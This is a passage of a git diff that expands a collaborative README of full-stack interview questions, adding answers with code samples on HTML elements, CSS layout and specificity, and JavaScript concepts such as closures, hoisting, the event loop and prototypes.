@@ -1,6 +1,6 @@
 # FullStack Interview Preparation
 
-A collection of common **HTML, CSS, JavaScript, React, and Node.js** interview questions with answers.  
+A collection of common **HTML, CSS, JavaScript, React, Node.js, and TypeScript** interview questions with answers.  
 This repo is collaborative — feel free to contribute more questions 🚀
 
 ---
@@ -11,15 +11,29 @@ This repo is collaborative — feel free to contribute more questions 🚀
 - [JavaScript](#javascript)
 - [React](#react)
 - [Node.js](#nodejs)
+- [TypeScript](#typescript)
 
 ---
 
 ## 🟠 HTML
 
 1. What is the difference between block, inline, and inline-block elements?
-   - **Block:** Takes full width (`<div>`, `<p>`, `<h1>`).
-   - **Inline:** Takes only needed space (`<span>`, `<a>`).
-   - **Inline-block:** Behaves like inline but supports width/height.
+   - **Block:** Takes full width, starts on a new line (`<div>`, `<p>`, `<h1>`).
+   - **Inline:** Takes only needed space, flows within text — ignores width/height (`<span>`, `<a>`, `<strong>`).
+   - **Inline-block:** Flows inline (no new line) but respects width and height.
+
+   | Property | Block | Inline | Inline-block |
+   | --- | --- | --- | --- |
+   | Starts on new line | ✅ Yes | ❌ No | ❌ No |
+   | Respects width/height | ✅ Yes | ❌ No | ✅ Yes |
+   | Margin/padding (all sides) | ✅ Yes | Left/Right only | ✅ Yes |
+   | Examples | `<div>`, `<p>`, `<h1>` | `<span>`, `<a>`, `<strong>` | `<button>`, `<img>` |
+
+   ```css
+   div  { display: block; }         /* full width, forces new line */
+   span { display: inline; }        /* flows with text, ignores width/height */
+   img  { display: inline-block; }  /* inline flow + respects dimensions */
+   ```
 
 2. What are semantic HTML tags? Why are they important?
    - Tags that describe meaning, not just presentation (`<header>`, `<article>`, `<footer>`).
@@ -48,6 +62,124 @@ This repo is collaborative — feel free to contribute more questions 🚀
    - **APIs:** Geolocation, Local Storage, Canvas
    - **Web Workers**
 
+6. What is the difference between `<script>`, `<script async>`, and `<script defer>`?
+
+   | Type | Downloads | Execution |
+   | --- | --- | --- |
+   | `<script>` | Blocks HTML parsing | Immediately when encountered |
+   | `<script async>` | Parallel (non-blocking) | As soon as downloaded (may interrupt parsing) |
+   | `<script defer>` | Parallel (non-blocking) | After full HTML is fully parsed |
+
+   - Use **`defer`** for most scripts — safe, order-preserved.
+   - Use **`async`** for independent scripts (analytics, ads) that don't depend on DOM or other scripts.
+
+   ```html
+   <script src="app.js" defer></script>
+   ```
+
+7. What is the difference between `src` and `href`?
+   - **`src`** (source): Embeds the resource directly — browser fetches and replaces the element. Blocks parsing when used in `<script>`.
+   - **`href`** (hyperlink reference): Links to an external resource — creates a relationship without embedding.
+
+   ```html
+   <script src="app.js"></script>            <!-- embeds JS -->
+   <img src="photo.jpg" alt="Photo" />       <!-- embeds image -->
+   <link href="style.css" rel="stylesheet">  <!-- links CSS -->
+   <a href="https://example.com">Link</a>   <!-- hyperlink -->
+   ```
+
+8. What are void (self-closing) elements in HTML?
+   - Elements that **cannot have child nodes** and do not need a closing tag.
+   - Examples: `<br>`, `<hr>`, `<img>`, `<input>`, `<link>`, `<meta>`, `<area>`, `<base>`, `<col>`, `<embed>`, `<source>`, `<track>`.
+
+   ```html
+   <input type="text" placeholder="Name" />
+   <img src="logo.png" alt="Logo" />
+   <br />
+   ```
+
+9. What is the DOM (Document Object Model)?
+   - The DOM is a **programming interface** that represents an HTML page as a **tree of nodes** in memory. The browser parses HTML and builds this tree — JavaScript uses it to read, create, update, and delete elements dynamically.
+
+   ```
+   Document
+   └── <html>
+       ├── <head>
+       │   └── <title>My Page</title>
+       └── <body>
+           ├── <h1 id="title">Hello</h1>
+           └── <p class="text">World</p>
+   ```
+
+   ```js
+   // Selecting elements
+   document.getElementById("title").textContent = "New Title";
+   document.querySelector(".text").style.color = "red";
+   document.querySelectorAll("li").forEach(li => console.log(li.textContent));
+
+   // Creating and inserting nodes
+   const p = document.createElement("p");
+   p.textContent = "Added dynamically";
+   document.body.appendChild(p);
+
+   // Removing an element
+   document.querySelector("#title").remove();
+   ```
+
+   | DOM API | Description |
+   | --- | --- |
+   | `getElementById()` | Select element by `id` |
+   | `querySelector()` | First match by CSS selector |
+   | `querySelectorAll()` | All matches by CSS selector |
+   | `createElement()` | Create a new element |
+   | `appendChild()` | Add child node at the end |
+   | `innerHTML` | Get/set HTML content |
+   | `textContent` | Get/set text (no HTML parsing) |
+   | `addEventListener()` | Attach event handler |
+
+10. What are `data-*` attributes in HTML?
+    - Custom attributes that store extra information on HTML elements — accessible in JavaScript via `element.dataset`.
+    - Attribute names are automatically camelCased in `dataset`.
+
+    ```html
+    <button data-user-id="42" data-role="admin">Click Me</button>
+    ```
+
+    ```js
+    const btn = document.querySelector("button");
+    console.log(btn.dataset.userId); // "42"
+    console.log(btn.dataset.role);   // "admin"
+    ```
+
+11. What is the difference between `<b>` & `<strong>`, and `<i>` & `<em>`?
+
+    | Tag | Visual | Semantic Meaning |
+    | --- | --- | --- |
+    | `<b>` | Bold | None (purely visual) |
+    | `<strong>` | Bold | Important content — emphasized by screen readers |
+    | `<i>` | Italic | None (purely visual) |
+    | `<em>` | Italic | Stressed content — tone changed by screen readers |
+
+    - Prefer `<strong>` and `<em>` for **accessibility** and **SEO**.
+
+12. What are `<meta>` tags and what are they used for?
+    - Provide **metadata** about the HTML document — placed inside `<head>`, not displayed on the page.
+
+    ```html
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Full-stack interview preparation guide">
+    <meta property="og:title" content="Interview Guide">
+    ```
+
+13. What is the difference between `<section>`, `<article>`, and `<div>`?
+
+    | Tag | Purpose |
+    | --- | --- |
+    | `<section>` | Groups related content with a theme — part of a larger whole (e.g., page chapters) |
+    | `<article>` | Self-contained, independently reusable content (e.g., blog post, news card) |
+    | `<div>` | Generic container — no semantic meaning, used for styling/layout only |
+
 ---
 
 ## 🔵 CSS
@@ -68,6 +200,262 @@ This repo is collaborative — feel free to contribute more questions 🚀
    - `em`: Relative to parent font-size.
    - `rem`: Relative to root (`html`) font-size.
    - `%`: Relative to parent container.
+
+4. What is the CSS Box Model?
+   - Every HTML element is a rectangular box made of four layers (inside out):
+     1. **Content** — actual text or image
+     2. **Padding** — space between content and border
+     3. **Border** — surrounds the padding
+     4. **Margin** — space outside the border (gap between elements)
+
+   ```
+   ┌──────────────────────────┐
+   │          Margin          │
+   │  ┌────────────────────┐  │
+   │  │       Border       │  │
+   │  │  ┌──────────────┐  │  │
+   │  │  │   Padding    │  │  │
+   │  │  │ ┌──────────┐ │  │  │
+   │  │  │ │ Content  │ │  │  │
+   │  │  │ └──────────┘ │  │  │
+   │  │  └──────────────┘  │  │
+   │  └────────────────────┘  │
+   └──────────────────────────┘
+   ```
+
+   ```css
+   div {
+     width: 200px;      /* content width */
+     padding: 10px;     /* inner space */
+     border: 2px solid; /* border */
+     margin: 20px;      /* outer space */
+   }
+   ```
+
+   - `box-sizing: content-box` (default) — `width` applies to content only; padding/border add to total size.
+   - `box-sizing: border-box` — `width` includes content + padding + border. Preferred for layouts.
+
+   ```css
+   * { box-sizing: border-box; } /* common CSS reset */
+   ```
+
+5. What are pseudo-classes and pseudo-elements?
+   - **Pseudo-class** (`:`) — selects elements based on their **state** or **position** in the DOM.
+   - **Pseudo-element** (`::`) — selects and styles a **specific part** of an element.
+
+   | Type | Syntax | Examples |
+   | --- | --- | --- |
+   | Pseudo-class | `:` | `:hover`, `:focus`, `:nth-child()`, `:first-child`, `:checked`, `:disabled` |
+   | Pseudo-element | `::` | `::before`, `::after`, `::first-line`, `::first-letter`, `::placeholder` |
+
+   ```css
+   /* Pseudo-classes */
+   a:hover         { color: blue; }
+   input:focus     { border-color: green; }
+   li:nth-child(2) { background: #eee; }
+
+   /* Pseudo-elements */
+   p::first-letter  { font-size: 2em; }
+   .btn::before     { content: "→ "; }
+   input::placeholder { color: #aaa; }
+   ```
+
+6. What is Flexbox?
+   - A **one-dimensional** layout model for arranging items in a row or column.
+   - Parent becomes the **flex container**; direct children become **flex items**.
+
+   ```css
+   .container {
+     display: flex;
+     justify-content: center;  /* main axis alignment (horizontal by default) */
+     align-items: center;      /* cross axis alignment (vertical) */
+     gap: 16px;
+     flex-wrap: wrap;          /* allow items to wrap to next line */
+   }
+   .item { flex: 1; }          /* grow/shrink equally */
+   ```
+
+   | Property | Description |
+   | --- | --- |
+   | `flex-direction` | `row` (default) or `column` |
+   | `justify-content` | Main axis: `center`, `space-between`, `space-around` |
+   | `align-items` | Cross axis: `center`, `flex-start`, `stretch` |
+   | `flex-wrap` | Allow items to wrap |
+   | `flex: 1` | Shorthand for grow, shrink, basis |
+
+7. What is CSS Grid?
+   - A **two-dimensional** layout system for placing items in rows and columns simultaneously.
+
+   ```css
+   .container {
+     display: grid;
+     grid-template-columns: repeat(3, 1fr); /* 3 equal columns */
+     gap: 16px;
+   }
+   .item-wide { grid-column: 1 / 3; } /* span columns 1 to 3 */
+   ```
+
+   | Flexbox | Grid |
+   | --- | --- |
+   | 1D (row OR column) | 2D (row AND column) |
+   | Content-driven | Layout-driven |
+   | Navigation, toolbars | Page layouts, galleries |
+
+8. What is CSS specificity?
+   - A scoring system that determines which CSS rule applies when multiple rules target the same element.
+
+   | Selector Type | Score |
+   | --- | --- |
+   | Inline style (`style=""`) | 1000 |
+   | ID (`#id`) | 100 |
+   | Class, attribute, pseudo-class (`.class`, `[attr]`, `:hover`) | 10 |
+   | Element, pseudo-element (`div`, `::before`) | 1 |
+   | Universal (`*`) | 0 |
+
+   ```css
+   p       { color: black; }  /* specificity: 1 */
+   .text   { color: blue; }   /* specificity: 10 */
+   #title  { color: red; }    /* specificity: 100 — wins */
+   ```
+
+   - Higher specificity wins. Equal specificity → last rule wins (cascade order).
+   - `!important` overrides all — use sparingly.
+
+9. What is the difference between `display: none`, `visibility: hidden`, and `opacity: 0`?
+
+   | Property | Visible | Occupies Space | Events/Accessibility |
+   | --- | --- | --- | --- |
+   | `display: none` | ❌ | ❌ Removed from layout | ❌ |
+   | `visibility: hidden` | ❌ | ✅ Holds space | ❌ |
+   | `opacity: 0` | ❌ | ✅ Holds space | ✅ Still clickable |
+
+   ```css
+   .gone        { display: none; }         /* removed from layout entirely */
+   .invisible   { visibility: hidden; }    /* hidden but holds space */
+   .transparent { opacity: 0; }           /* invisible but still interactive */
+   ```
+
+10. What is `z-index` in CSS?
+    - Controls the **stacking order** of positioned elements (`position` other than `static`).
+    - Higher value = in front; lower = behind.
+
+    ```css
+    .modal   { position: fixed;    z-index: 1000; }
+    .overlay { position: fixed;    z-index: 999;  }
+    .content { position: relative; z-index: 1;    }
+    ```
+
+    - `z-index` only works on elements with `position: relative`, `absolute`, `fixed`, or `sticky`.
+
+11. What are CSS variables (custom properties)?
+    - Variables defined with `--` prefix, accessed with `var()`. Defined on `:root` to be globally available.
+
+    ```css
+    :root {
+      --primary: #3498db;
+      --font-base: 16px;
+    }
+
+    button {
+      background: var(--primary);
+      font-size: var(--font-base);
+    }
+
+    .dark-theme { --primary: #1a1a1a; } /* override per scope */
+    ```
+
+12. What is a CSS media query?
+    - Applies styles conditionally based on device characteristics (screen width, orientation, etc.).
+
+    ```css
+    /* Mobile first */
+    .container { width: 100%; }
+
+    @media (min-width: 768px)  { .container { width: 750px; } }   /* tablet */
+    @media (min-width: 1200px) { .container { width: 1170px; } }  /* desktop */
+
+    @media (prefers-color-scheme: dark) {
+      body { background: #000; color: #fff; }
+    }
+    ```
+
+13. What is the difference between `margin` and `padding`?
+    - **Padding:** Space **inside** the element (between content and border) — inherits background color.
+    - **Margin:** Space **outside** the element (between border and neighbors) — always transparent.
+
+    | Property | Location | Background | Collapses? |
+    | --- | --- | --- | --- |
+    | `padding` | Inside (content ↔ border) | ✅ Yes | ❌ No |
+    | `margin` | Outside (border ↔ next element) | ❌ No | ✅ Yes (vertical) |
+
+    ```css
+    div { padding: 10px; margin: 20px; }
+    ```
+
+14. What is `overflow` in CSS?
+    - Controls what happens when content is too large to fit its container.
+
+    | Value | Behavior |
+    | --- | --- |
+    | `visible` (default) | Content overflows outside the box |
+    | `hidden` | Overflow clipped and invisible |
+    | `scroll` | Always shows scrollbars |
+    | `auto` | Scrollbars only when needed |
+
+    ```css
+    .box     { width: 200px; height: 100px; overflow: auto; }
+    .clamp   { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    ```
+
+15. What is the difference between `transition` and `animation`?
+
+    | Feature | `transition` | `animation` |
+    | --- | --- | --- |
+    | Trigger | Requires state change (hover, class toggle) | Runs automatically |
+    | Keyframes | ❌ No | ✅ Yes (`@keyframes`) |
+    | Loops | ❌ No | ✅ Yes (`infinite`) |
+
+    ```css
+    /* transition — triggered by :hover */
+    .btn { transition: background 0.3s ease; }
+    .btn:hover { background: blue; }
+
+    /* animation — runs on its own */
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+    .loader { animation: spin 1s linear infinite; }
+    ```
+
+16. What is `calc()` in CSS?
+    - Performs **math calculations** directly in CSS — can mix different units.
+
+    ```css
+    .sidebar { width: calc(100% - 250px); }
+    .hero    { height: calc(100vh - 60px); } /* full viewport minus navbar height */
+    .box     { padding: calc(1rem + 4px); }
+    ```
+
+17. What is `object-fit` in CSS?
+    - Controls how a replaced element (`<img>`, `<video>`) fits within its container box.
+
+    | Value | Behavior |
+    | --- | --- |
+    | `fill` (default) | Stretches to fill — may distort aspect ratio |
+    | `contain` | Scales to fit — maintains ratio, may leave empty space |
+    | `cover` | Scales to fill — maintains ratio, may crop edges |
+    | `none` | Original size, no scaling |
+    | `scale-down` | Smaller of `none` or `contain` |
+
+    ```css
+    img {
+      width: 300px;
+      height: 200px;
+      object-fit: cover;       /* fills box, crops if needed — no distortion */
+      object-position: center; /* focal point of the crop */
+    }
+    ```
 
 ---
 
@@ -296,6 +684,611 @@ This repo is collaborative — feel free to contribute more questions 🚀
         caches.match(event.request).then((cached) => cached || fetch(event.request))
       );
     });
+    ```
+
+16. What is JavaScript?
+    - JavaScript is a **Single-Threaded** and **Synchronous** language by default.
+    - **Single-Threaded** — can execute only one task at a time in a single main thread.
+    - **Main Thread** — where JavaScript code executes one line at a time.
+    - **Synchronous** — one task must complete before the next begins.
+    - Handles async operations via Callbacks, Promises, and Async/Await using the Event Loop & Web APIs.
+
+    | Main Thread | Call Stack |
+    | --- | --- |
+    | Single pipeline where all tasks execute | Data structure tracking which function is currently running |
+    | Handles Code Execution + DOM + Events | Only handles Function Execution |
+    | Whole JS code runs inside Main Thread | Only functions push & pop inside Call Stack |
+
+    **Primitive vs Non-Primitive Data Types:**
+
+    | Feature | Primitive | Non-Primitive |
+    | --- | --- | --- |
+    | Definition | Stores single immutable value | Stores collections or objects |
+    | Types | String, Number, Boolean, Undefined, Null, Symbol, BigInt | Object, Array, Function, Date, RegExp, Map, Set |
+    | Memory | Stack Memory | Heap Memory |
+    | Access | By value | By reference |
+    | Mutable? | ❌ Immutable | ✅ Mutable |
+    | Copy | Copies the value itself | Copies the reference |
+
+    ```js
+    // Primitive
+    let str = "Hello"
+    str.length = 0 // TypeError: Cannot assign to read only property 'length'
+
+    // Non-Primitive
+    let arr = ["Hello", "World"]
+    arr.length = 0
+    console.log(arr) // []
+    ```
+
+17. How JavaScript Works?
+    - When JavaScript runs, it creates a **Global Execution Context** inside the Call Stack.
+    - Execution context has two phases:
+
+    **1. Memory Allocation (Variable Environment Phase)**
+    - Memory is set up for all variables and functions.
+    - Variables are assigned `undefined` initially.
+    - Functions are assigned their actual definition.
+
+    **2. Code Execution (Thread of Execution Phase)**
+    - Code executes line by line.
+    - Variables get their actual values; functions are invoked.
+
+    Each time a function is called, a **new execution context** is created and pushed onto the call stack on top of the global execution context.
+
+18. What is Hoisting? (Detailed)
+    - Variables and function **declarations** are moved to the top of their scope during compile phase.
+
+    ```js
+    // Function Declaration — hoisted entirely
+    greet(); // "Hello!"
+    function greet() { console.log("Hello!"); }
+
+    // Function Expression — NOT hoisted
+    greet(); // Error: greet is not a function
+    var greet = function() { console.log("Hello!"); };
+
+    // var — hoisted as undefined
+    console.log(x); // undefined
+    var x = 10;
+
+    // let — hoisted but in Temporal Dead Zone
+    console.log(a); // ReferenceError: Cannot access 'a' before initialization
+    let a = 5;
+    ```
+
+    - `var`: hoisted and initialized as `undefined`.
+    - `let` / `const`: hoisted but NOT initialized — accessing before declaration throws `ReferenceError` (Temporal Dead Zone).
+
+19. Difference between `undefined` and `not defined`?
+    - `undefined`: Variable is **declared** but not yet assigned a value — JavaScript auto-assigns this.
+    - `not defined`: Variable is **never declared** — accessing it throws `ReferenceError`.
+
+20. What is Lexical Environment?
+    - Created whenever an execution context is created.
+    - It is a combination of **local memory** (variable environment) + a **reference to the parent's lexical environment**.
+    - The outer environment reference enables access to variables from parent scopes — the foundation of **closures**.
+
+21. What is Scope?
+    - Scope defines where you can access variables, functions, and objects in your code.
+
+    | Scope | Lexical Environment |
+    | --- | --- |
+    | Area where variables are accessible | Real-time structure created during execution |
+    | Static (decided at write time) | Dynamic (created at runtime) |
+    | Does not store variables | Stores variables and outer references |
+
+    **Types of Scope:**
+
+    | Type | Description |
+    | --- | --- |
+    | Global Scope | Accessible everywhere |
+    | Function Scope | Accessible only inside the function |
+    | Block Scope | Accessible inside `{}` blocks only (`let` & `const`) |
+    | Lexical Scope | Inner function can access outer function's variables |
+
+22. What is Scope Chaining?
+    - The process where JavaScript searches for variables from the current scope outward until it finds the variable or reaches the global scope.
+    1. Search in **current scope** (Local).
+    2. If not found, search in the **parent scope**.
+    3. Continue up the chain to **Global Scope**.
+    4. If still not found → `ReferenceError: not defined`.
+
+23. What is `let`, `const`, and `var`? (Detailed)
+
+    | Feature | `var` | `let` | `const` |
+    | --- | --- | --- | --- |
+    | Scope | Function Scope | Block Scope | Block Scope |
+    | Reassign | ✅ Yes | ✅ Yes | ❌ No |
+    | Redeclare | ✅ Yes | ❌ No | ❌ No |
+    | Hoisting | ✅ `undefined` | Hoisted (TDZ) | Hoisted (TDZ) |
+    | Initialization | Optional | Optional | Mandatory |
+
+    **Types of Errors:**
+
+    | Keyword | Error Type | When |
+    | --- | --- | --- |
+    | `let` | `ReferenceError` | Access before declaration |
+    | `let` | `SyntaxError` | Redeclare variable |
+    | `const` | `TypeError` | Reassign value |
+    | `const` | `SyntaxError` | Missing initialization |
+    | `const` | `ReferenceError` | Access before declaration |
+
+24. What is Temporal Dead Zone (TDZ)?
+    - The time period between the **declaration** of a `let`/`const` variable and its **initialization**, during which the variable cannot be accessed.
+    - `let`/`const` variables are hoisted but kept in the TDZ until the initialization line is reached.
+    - Accessing them during TDZ throws a `ReferenceError`.
+
+25. What is Shadowing in JavaScript?
+    - Occurs when a variable in a local scope has the same name as a variable in an outer scope — the inner variable **overrides (shadows)** the outer one inside its scope.
+    - **Illegal Shadowing:** A `let`/`const` variable cannot shadow a `var` variable in the same scope.
+
+    | Concept | Description | Priority |
+    | --- | --- | --- |
+    | Shadowing | Local variable overrides outer variable | Local Scope wins |
+    | Scope Chain | Search from inner to outer scope | Closest match wins |
+
+26. What is Closure? (Detailed)
+    - A closure is a function **bundled together with references to its surrounding lexical environment**.
+    - Gives a function access to its own scope, outer function variables, and global variables — even after the outer function has finished executing.
+    - Closures are created every time a function is created in JavaScript.
+
+    ```js
+    function outer() {
+      let outerVar = "I'm in the outer scope!";
+      function inner() { console.log(outerVar); }
+      return inner;
+    }
+    const closure = outer();
+    closure(); // "I'm in the outer scope!"
+    ```
+
+27. Advantages of Closures
+    - **Data Encapsulation** — create private variables inaccessible from outside.
+    - **`setTimeout` with Loops** — preserve variable values inside loops.
+    - **Currying** — closures are the foundation of curried functions.
+
+    ```js
+    // Data Encapsulation (Private Variable)
+    function counter() {
+      let count = 0;
+      return function() { count++; console.log(count); };
+    }
+    const increment = counter();
+    increment(); // 1
+    increment(); // 2
+
+    // setTimeout with loops — without closure (bug)
+    for (var i = 1; i <= 3; i++) {
+      setTimeout(() => console.log(i), i * 1000);
+    }
+    // Output: 4 4 4
+
+    // With closure (fix)
+    for (var i = 1; i <= 3; i++) {
+      (function(j) {
+        setTimeout(() => console.log(j), j * 1000);
+      })(i);
+    }
+    // Output: 1 2 3
+    ```
+
+28. What is Currying?
+    - A technique where a function takes **one argument at a time**, returning a new function for each additional argument until all arguments are received.
+
+    ```js
+    // Without Currying
+    function add(a, b, c) { return a + b + c; }
+    console.log(add(2, 3, 4)); // 9
+
+    // With Currying
+    function add(a) {
+      return function(b) {
+        return function(c) { return a + b + c; };
+      };
+    }
+    console.log(add(2)(3)(4)); // 9
+
+    // Generic curry helper
+    function curry(fn) {
+      return function curried(...args) {
+        if (args.length >= fn.length) return fn.apply(this, args);
+        return curried.bind(this, ...args);
+      };
+    }
+    const curriedSum = curry((a, b, c) => a + b + c);
+    console.log(curriedSum(1)(2)(3)); // 6
+    ```
+
+29. What is `call()`, `apply()`, and `bind()`?
+    - `call()`: Invokes a function **immediately**, passing `this` and arguments one by one.
+    - `apply()`: Invokes a function **immediately**, passing `this` and arguments as an **array**.
+    - `bind()`: Returns a **new function** with a fixed `this` — does not execute immediately.
+
+    | Method | Execution | Arguments | Return Value |
+    | --- | --- | --- | --- |
+    | `call()` | Immediately | Comma-separated | Function result |
+    | `apply()` | Immediately | Array format | Function result |
+    | `bind()` | Later | Comma-separated | New Function |
+
+    ```js
+    const person = { name: "Mohamed", greet(city) { console.log(`${this.name} from ${city}`); } };
+    const person2 = { name: "Nasrutheen" };
+
+    person.greet.call(person2, "Chennai");        // Nasrutheen from Chennai
+    person.greet.apply(person2, ["Chennai"]);      // Nasrutheen from Chennai
+    const bound = person.greet.bind(person2, "Chennai");
+    bound();                                       // Nasrutheen from Chennai
+    ```
+
+30. What is Garbage Collection?
+    - An automatic memory management process that frees memory by removing unused objects using the **Mark and Sweep algorithm**.
+
+    ```js
+    function outer() {
+      let name = "Mohamed";
+      return function inner() { console.log(name); };
+    }
+    let result = outer();
+    result(); // `name` is NOT GC'd — closure holds a reference
+
+    function outer2() {
+      let name = "Mohamed";
+      return function inner() { console.log("Hello"); };
+    }
+    let result2 = outer2();
+    // `name` IS GC'd — no reference in the returned closure
+    ```
+
+31. What is a First-Class Function and First-Class Citizen?
+    - Functions are **First-Class Citizens** — they can be assigned to variables, passed as arguments, and returned from other functions, just like any other value.
+
+    | Concept | Meaning |
+    | --- | --- |
+    | First-Class Function | Functions can be assigned, passed, and returned |
+    | First-Class Citizen | The function itself — acts like any value |
+
+    ```js
+    const greet = function() { return "Hello!"; };    // Assigned to a variable
+
+    function welcome(fn) { return fn(); }
+    console.log(welcome(greet)); // "Hello!" — passed as argument
+
+    function getGreet() {
+      return function() { return "Hello Boss!"; };    // Returned from a function
+    }
+    console.log(getGreet()()); // "Hello Boss!"
+    ```
+
+32. Function Statement vs Expression vs Anonymous vs Named Function Expression
+
+    | Term | Description |
+    | --- | --- |
+    | Function Statement / Declaration | `function` keyword — hoisted entirely |
+    | Function Expression | Function assigned to a variable — not hoisted |
+    | Anonymous Function | Function without a name, used in expressions or callbacks |
+    | Named Function Expression | Function with an internal name assigned to a variable — useful for debugging |
+    | Parameters | Variables in the function definition |
+    | Arguments | Actual values passed when calling the function |
+
+    ```js
+    function greet(name) { console.log("Hello " + name); }     // Function Statement
+    const sum = function(a, b) { return a + b; };               // Function Expression
+    const multiply = function(a, b) { return a * b; };          // Anonymous Function
+    const divide = function divide(a, b) { return a / b; };     // Named Function Expression
+
+    function welcome(name, age) { console.log(`${name}, ${age}`); }  // name, age = parameters
+    welcome("Mohamed", 25);                                           // "Mohamed", 25 = arguments
+    ```
+
+33. What is a Callback Function, Pure Function, and Higher-Order Function?
+    - **Callback Function:** A function passed as an argument to another function.
+    - **Pure Function:** Always returns the same output for the same input; no side effects.
+    - **Higher-Order Function (HOF):** Takes another function as an argument or returns a function.
+
+34. What is the Event Loop? (Detailed)
+    - The Event Loop manages execution of synchronous and asynchronous tasks by checking the Call Stack, Microtask Queue, and Callback Queue (Macrotask Queue).
+    - Continuously checks: Call Stack empty? → drain all **Microtasks** → run one **Macrotask** → repeat.
+
+    | Queue | Examples | Priority |
+    | --- | --- | --- |
+    | Microtasks | `Promise.then()`, `async/await`, `MutationObserver` | ⬆ High |
+    | Macrotasks (Callback Queue) | `setTimeout()`, `setInterval()`, `setImmediate()` (Node.js) | ⬇ Low |
+
+35. What is JIT (Just-In-Time) Compilation?
+    - JIT converts JavaScript code into machine code **at runtime** to improve performance.
+    - Combines both **Interpretation** and **Compilation** for optimized execution.
+
+36. What is the JavaScript Runtime Environment?
+    - Provides everything needed to execute JavaScript code. Includes:
+      - **JavaScript Engine** (V8 for Chrome/Node.js)
+      - **Web APIs** (`setTimeout`, DOM APIs, `fetch`)
+      - **Callback Queue**
+      - **Event Loop**
+    - Node.js is a popular JavaScript Runtime Environment for server-side development.
+
+37. What is the Memory Heap?
+    - A region where JavaScript stores dynamic data like objects and functions — unordered, managed by the engine.
+    - Primitive values → stored in the **Call Stack**.
+    - Objects and functions → stored in the **Heap**.
+    - Garbage Collection (Mark and Sweep) automatically frees unused Heap memory.
+
+38. What is Functional Programming in JavaScript?
+    - A programming style using **pure, reusable functions** that operate on data without side effects, promoting immutability and code reusability.
+    - Key concepts: **First-Class Functions**, **Higher-Order Functions**, **Pure Functions**, **Immutability**, **Recursion**, **Closures**.
+
+39. What is Immutability?
+    - Original data **cannot be changed**. Instead, a new copy is created with modifications.
+    - Leads to predictable, bug-free code — a core principle of functional programming.
+
+40. What is Callback Hell, and how do Promises and async/await solve it?
+    - **Callback Hell:** Multiple nested callbacks making code hard to read and maintain.
+
+    | Callback Hell | Promises |
+    | --- | --- |
+    | Deeply nested functions | Flat `.then()` chain |
+    | Hard to read & debug | Readable with built-in `.catch()` |
+
+    **Promise Methods:**
+
+    | Method | Description |
+    | --- | --- |
+    | `Promise.all()` | Waits for all to resolve; rejects if any fails |
+    | `Promise.race()` | Returns the first to resolve or reject |
+    | `Promise.allSettled()` | Waits for all to settle (resolve or reject) |
+    | `Promise.any()` | Returns first to resolve; ignores rejections |
+    | `Promise.resolve()` | Returns an already-resolved promise |
+    | `Promise.reject()` | Returns an already-rejected promise |
+
+    `async`/`await` is syntactic sugar over Promises — makes async code look synchronous.
+
+    ```js
+    // Callback Hell
+    createOrder(() => {
+      makePayment(() => {
+        showInvoice(() => {
+          sendEmail(() => { console.log("Done"); });
+        });
+      });
+    });
+
+    // Promises
+    createOrder()
+      .then(makePayment)
+      .then(showInvoice)
+      .then(sendEmail)
+      .then(() => console.log("Done"))
+      .catch(() => console.log("Error!"));
+
+    // async/await
+    async function loadData() {
+      try {
+        const res = await fetch("https://api.example.com/data");
+        const data = await res.json();
+        console.log(data);
+      } catch (err) {
+        console.error(err);
+      }
+    }
+    ```
+
+41. What is Inversion of Control?
+    - Giving control of program flow to another function — instead of managing all logic yourself, you pass the control to another function to decide when and how your code executes.
+
+    ```js
+    function greet(callback) {
+      console.log("Welcome!");
+      callback(); // Control is given to the callback
+    }
+    greet(() => console.log("Hello World"));
+    ```
+
+42. What is `process.nextTick()`?
+    - A Node.js feature that schedules a callback to execute **immediately after the current operation**, before any I/O events or timers.
+    - Runs before `setTimeout()`, `setImmediate()`, and I/O — part of the microtask queue.
+
+43. What is the `this` keyword in JavaScript?
+    - `this` refers to the **current execution context** — its value depends on how and where the function is called.
+
+    ```js
+    console.log(this); // window {} (global)
+
+    const obj = {
+      a: 10,
+      fun: function() { console.log(this.a); },   // 10 — method call
+      arrow: () => { console.log(this.a); },       // undefined — inherits outer `this` (global)
+      fun2: function() {
+        const inner = () => { console.log(this.a); };
+        inner(); // 10 — arrow inherits from fun2's context
+      }
+    };
+
+    const person = {
+      name: "Mohamed",
+      greet2: function() {
+        setTimeout(() => { console.log(this.name); }, 1000); // Mohamed — arrow keeps parent `this`
+      }
+    };
+
+    const student = { name: "Mohamed", printName: function() { console.log(this.name); } };
+    const student2 = { name: "Nasrutheen" };
+    student.printName.call(student2); // Nasrutheen — call() overrides `this`
+    ```
+
+44. What is Inheritance and Prototypal Inheritance?
+    - **Inheritance:** An OOP concept where a child class acquires properties and methods of a parent class.
+    - **Prototypal Inheritance:** JavaScript's mechanism where objects inherit from other objects through the **prototype chain** — if a property/method is not on the object itself, JavaScript looks up `[[Prototype]]`.
+
+45. What is Event Propagation?
+    - How events travel through the DOM. Three phases:
+      1. **Capturing Phase** — Parent → Child (top-down)
+      2. **Target Phase** — The exact element clicked
+      3. **Bubbling Phase** — Child → Parent (bottom-up)
+
+46. What is Event Bubbling?
+    - Events move from the **target element (child) up to its parents**.
+    - Example: clicking a `<button>` inside a `<div>`: `button → div → body → document → window`.
+
+47. What is Event Capturing?
+    - Events move from the **parent down to the target child** before reaching it.
+    - Enable capturing by passing `true` as the third argument to `addEventListener`:
+    ```js
+    element.addEventListener("click", handler, true);
+    ```
+
+48. What is Event Delegation? (JavaScript)
+    - Attach **one event listener to a parent** instead of multiple listeners on individual children.
+    - Detect which child triggered the event using `event.target`.
+    ```js
+    document.querySelector("#list").addEventListener("click", (e) => {
+      if (e.target.tagName === "LI") {
+        console.log("Clicked:", e.target.innerText);
+      }
+    });
+    ```
+
+49. What is the Prototype Object Model in JavaScript?
+    - Every JavaScript object has an internal `[[Prototype]]` link pointing to another object — its **prototype**.
+    - When you access a property, JavaScript first looks on the object itself; if not found, it walks up the **prototype chain** until it finds it or reaches `null`.
+
+    ```js
+    const animal = { eat: true };
+    const dog = Object.create(animal); // dog's [[Prototype]] = animal
+    dog.bark = true;
+
+    console.log(dog.bark);               // true  — own property
+    console.log(dog.eat);                // true  — inherited from animal
+    console.log(dog.hasOwnProperty("eat"));  // false
+    console.log(dog.hasOwnProperty("bark")); // true
+
